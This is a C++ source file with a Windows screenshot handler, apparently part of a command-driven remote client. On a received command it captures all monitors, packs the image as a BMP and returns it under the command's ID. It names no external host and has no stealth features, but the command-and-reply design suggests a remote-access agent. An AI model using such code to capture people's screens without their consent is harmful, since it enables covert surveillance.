#include <base64.hpp>

#include "ScreenshotHandler.h"
#include "ReturnProductRequest.h"

#include "CommandFactory.h"
#include "ScreenshotProduct.h"


ScreenshotHandler::ScreenshotHandler(std::string client_id)
    : ICommandHandler(client_id)
{
}

std::unique_ptr<IRequest> ScreenshotHandler::handle(std::shared_ptr<BasicCommand>& command)
{
    std::string bmp_buffer = take_screenshot();
    return std::make_unique<ReturnProductRequest>(RequestHeader{ RequestType::ReturnProduct, m_client_id }, command->get_command_id(), ScreenshotProduct(command->get_command_id(), CommandType::Screenshot, std::move(bmp_buffer)).serialize());
}

std::string ScreenshotHandler::take_screenshot()
{
    // Get the desktop device context (DC) of the entire virtual screen
    HDC h_screen_dc = GetDC(nullptr);
    HDC h_memory_dc = CreateCompatibleDC(h_screen_dc);

    // Get the dimensions of the virtual screen (covers all monitors)
    int screen_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int screen_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int screen_left = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int screen_top = GetSystemMetrics(SM_YVIRTUALSCREEN);

    // Create a compatible bitmap from the screen DC
    HBITMAP h_bitmap = CreateCompatibleBitmap(h_screen_dc, screen_width, screen_height);

    // Select the compatible bitmap into the compatible memory DC
    HBITMAP h_old_bitmap = (HBITMAP)SelectObject(h_memory_dc, h_bitmap);

    // Bit block transfer into our compatible memory DC
    BitBlt(h_memory_dc, 0, 0, screen_width, screen_height, h_screen_dc, screen_left, screen_top, SRCCOPY);

    // Get the bitmap information
    BITMAP bmp;
    GetObject(h_bitmap, sizeof(BITMAP), &bmp);

    // Calculate the stride (row size) of the bitmap
    int row_size = ((bmp.bmWidth * bmp.bmBitsPixel + 31) / 32) * 4;

    // Bitmap file header
    BITMAPFILEHEADER file_header;
    BITMAPINFOHEADER info_header;

    // Fill the file header
    file_header.bfType = 0x4D42; // "BM"
    file_header.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    file_header.bfSize = file_header.bfOffBits + row_size * bmp.bmHeight;
    file_header.bfReserved1 = 0;
    file_header.bfReserved2 = 0;

    // Fill the info header
    info_header.biSize = sizeof(BITMAPINFOHEADER);
    info_header.biWidth = bmp.bmWidth;
    info_header.biHeight = bmp.bmHeight;
    info_header.biPlanes = 1;
    info_header.biBitCount = bmp.bmBitsPixel;
    info_header.biCompression = BI_RGB;
    info_header.biSizeImage = 0;
    info_header.biXPelsPerMeter = 0;
    info_header.biYPelsPerMeter = 0;
    info_header.biClrUsed = 0;
    info_header.biClrImportant = 0;

    // Allocate buffer for bitmap file
    std::string bmp_buffer(file_header.bfSize, '\0');

    // Copy headers
    memcpy(bmp_buffer.data(), &file_header, sizeof(BITMAPFILEHEADER));
    memcpy(bmp_buffer.data() + sizeof(BITMAPFILEHEADER), &info_header, sizeof(BITMAPINFOHEADER));

    // Copy bitmap data
    GetDIBits(h_memory_dc, h_bitmap, 0, bmp.bmHeight, bmp_buffer.data() + file_header.bfOffBits, (BITMAPINFO*)&info_header, DIB_RGB_COLORS);

    // Cleanup
    SelectObject(h_memory_dc, h_old_bitmap);
    DeleteObject(h_bitmap);
    DeleteDC(h_memory_dc);
    ReleaseDC(nullptr, h_screen_dc);

    // Convert the buffer to a string
    return bmp_buffer;
}
